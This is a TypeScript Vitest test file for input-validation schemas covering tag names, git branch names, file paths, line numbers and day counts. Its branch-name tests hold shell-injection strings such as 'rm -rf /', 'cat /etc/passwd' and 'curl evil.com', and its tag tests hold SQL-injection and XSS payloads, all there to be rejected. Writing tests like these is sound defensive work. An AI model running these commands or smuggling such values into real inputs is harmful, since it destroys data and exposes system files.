/* eslint-disable @typescript-eslint/no-explicit-any */
import { describe, it, expect } from 'vitest';
import {
  TagNameSchema,
  BranchNameSchema,
  FilePathSchema,
  LineNumberSchema,
  DaysSchema,
} from './validation.js';

describe('Validation Schemas - Input Validation', () => {
  describe('TagNameSchema - ANTAGONISTIC Tests', () => {
    it('should reject tag without hx- prefix', () => {
      expect(() => TagNameSchema.parse('button')).toThrow();
      expect(() => TagNameSchema.parse('my-component')).toThrow();
    });

    it('should reject uppercase letters', () => {
      expect(() => TagNameSchema.parse('hx-Button')).toThrow();
      expect(() => TagNameSchema.parse('HX-button')).toThrow();
    });

    it('should reject special characters', () => {
      expect(() => TagNameSchema.parse('hx-button@')).toThrow();
      expect(() => TagNameSchema.parse('hx-button!')).toThrow();
      expect(() => TagNameSchema.parse('hx-button$')).toThrow();
    });

    it('should reject spaces', () => {
      expect(() => TagNameSchema.parse('hx-button component')).toThrow();
      expect(() => TagNameSchema.parse('hx- button')).toThrow();
    });

    it('should reject empty string', () => {
      expect(() => TagNameSchema.parse('')).toThrow();
    });

    it('should reject just prefix', () => {
      expect(() => TagNameSchema.parse('hx-')).toThrow();
    });

    it('should reject SQL injection patterns', () => {
      expect(() => TagNameSchema.parse("hx-'; DROP TABLE components--")).toThrow();
    });

    it('should reject XSS patterns', () => {
      expect(() => TagNameSchema.parse('hx-<script>alert(1)</script>')).toThrow();
    });

    it('should accept valid tag names', () => {
      expect(TagNameSchema.parse('hx-button')).toBe('hx-button');
      expect(TagNameSchema.parse('hx-text-input')).toBe('hx-text-input');
      expect(TagNameSchema.parse('hx-radio-group')).toBe('hx-radio-group');
      expect(TagNameSchema.parse('hx-button-123')).toBe('hx-button-123');
    });
  });

  describe('BranchNameSchema - ANTAGONISTIC Tests', () => {
    it('should block semicolon injection', () => {
      expect(() => BranchNameSchema.parse('main; rm -rf /')).toThrow();
    });

    it('should block pipe injection', () => {
      expect(() => BranchNameSchema.parse('main | cat /etc/passwd')).toThrow();
    });

    it('should block ampersand injection', () => {
      expect(() => BranchNameSchema.parse('main && curl evil.com')).toThrow();
    });

    it('should block backtick injection', () => {
      expect(() => BranchNameSchema.parse('main`whoami`')).toThrow();
    });

    it('should block dollar sign injection', () => {
      expect(() => BranchNameSchema.parse('main$(whoami)')).toThrow();
    });

    it('should block redirection operators', () => {
      expect(() => BranchNameSchema.parse('main > /tmp/pwned')).toThrow();
      expect(() => BranchNameSchema.parse('main < /etc/passwd')).toThrow();
    });

    it('should block newline injection', () => {
      expect(() => BranchNameSchema.parse('main\nrm -rf /')).toThrow();
    });

    it('should block null byte injection', () => {
      expect(() => BranchNameSchema.parse('main\0evil')).toThrow();
    });

    it('should block special shell characters', () => {
      const malicious = ['*', '?', '!', '#', '%', '^', '&', '(', ')', '[', ']', '{', '}'];

      malicious.forEach((char) => {
        expect(() => BranchNameSchema.parse(`main${char}`)).toThrow();
      });
    });

    it('should accept valid branch names', () => {
      expect(BranchNameSchema.parse('main')).toBe('main');
      expect(BranchNameSchema.parse('feature-branch')).toBe('feature-branch');
      expect(BranchNameSchema.parse('feature_branch')).toBe('feature_branch');
      expect(BranchNameSchema.parse('feature/my-branch')).toBe('feature/my-branch');
      expect(BranchNameSchema.parse('release/v2.0.0')).toBe('release/v2.0.0');
      expect(BranchNameSchema.parse('RELEASE-2024')).toBe('RELEASE-2024');
    });
  });

  describe('FilePathSchema - Basic Validation', () => {
    it('should reject empty path', () => {
      expect(() => FilePathSchema.parse('')).toThrow();
    });

    it('should accept valid paths', () => {
      expect(FilePathSchema.parse('file.txt')).toBe('file.txt');
      expect(FilePathSchema.parse('dir/file.txt')).toBe('dir/file.txt');
      expect(FilePathSchema.parse('path/to/file.json')).toBe('path/to/file.json');
    });

    it('should accept paths with dots', () => {
      expect(FilePathSchema.parse('my.config.json')).toBe('my.config.json');
      expect(FilePathSchema.parse('.gitignore')).toBe('.gitignore');
    });
  });

  describe('LineNumberSchema - ANTAGONISTIC Tests', () => {
    it('should reject zero', () => {
      expect(() => LineNumberSchema.parse(0)).toThrow();
    });

    it('should reject negative numbers', () => {
      expect(() => LineNumberSchema.parse(-1)).toThrow();
      expect(() => LineNumberSchema.parse(-100)).toThrow();
    });

    it('should reject floats', () => {
      expect(() => LineNumberSchema.parse(1.5)).toThrow();
      expect(() => LineNumberSchema.parse(10.999)).toThrow();
    });

    it('should reject Infinity', () => {
      expect(() => LineNumberSchema.parse(Infinity)).toThrow();
      expect(() => LineNumberSchema.parse(-Infinity)).toThrow();
    });

    it('should reject NaN', () => {
      expect(() => LineNumberSchema.parse(NaN)).toThrow();
    });

    it('should reject very large numbers that could cause issues', () => {
      // While technically valid, extremely large line numbers are suspicious
      expect(() => LineNumberSchema.parse(Number.MAX_SAFE_INTEGER)).not.toThrow();
      // But the schema should handle them safely
    });

    it('should accept valid line numbers', () => {
      expect(LineNumberSchema.parse(1)).toBe(1);
      expect(LineNumberSchema.parse(100)).toBe(100);
      expect(LineNumberSchema.parse(9999)).toBe(9999);
    });
  });

  describe('DaysSchema - ANTAGONISTIC Tests', () => {
    it('should reject zero', () => {
      expect(() => DaysSchema.parse(0)).toThrow();
    });

    it('should reject negative numbers', () => {
      expect(() => DaysSchema.parse(-1)).toThrow();
      expect(() => DaysSchema.parse(-365)).toThrow();
    });

    it('should reject values over 365', () => {
      expect(() => DaysSchema.parse(366)).toThrow();
      expect(() => DaysSchema.parse(1000)).toThrow();
    });

    it('should reject floats', () => {
      expect(() => DaysSchema.parse(7.5)).toThrow();
    });

    it('should apply default of 7', () => {
      const result = DaysSchema.parse(undefined);
      expect(result).toBe(7);
    });

    it('should accept valid day ranges', () => {
      expect(DaysSchema.parse(1)).toBe(1);
      expect(DaysSchema.parse(7)).toBe(7);
      expect(DaysSchema.parse(30)).toBe(30);
      expect(DaysSchema.parse(365)).toBe(365);
    });
  });

  describe('COMPREHENSIVE: Type Coercion Attacks', () => {
    it('should not coerce strings to numbers', () => {
      expect(() => LineNumberSchema.parse('1' as any)).toThrow();
      expect(() => DaysSchema.parse('7' as any)).toThrow();
    });

    it('should not coerce booleans', () => {
      expect(() => LineNumberSchema.parse(true as any)).toThrow();
      expect(() => DaysSchema.parse(false as any)).toThrow();
    });

    it('should not coerce objects', () => {
      expect(() => TagNameSchema.parse({ name: 'hx-button' } as any)).toThrow();
    });

    it('should not coerce arrays', () => {
      expect(() => TagNameSchema.parse(['hx-button'] as any)).toThrow();
    });

    it('should reject null', () => {
      expect(() => TagNameSchema.parse(null as any)).toThrow();
      expect(() => BranchNameSchema.parse(null as any)).toThrow();
    });

    it('should reject undefined for required fields', () => {
      expect(() => TagNameSchema.parse(undefined as any)).toThrow();
      expect(() => BranchNameSchema.parse(undefined as any)).toThrow();
    });
  });
});
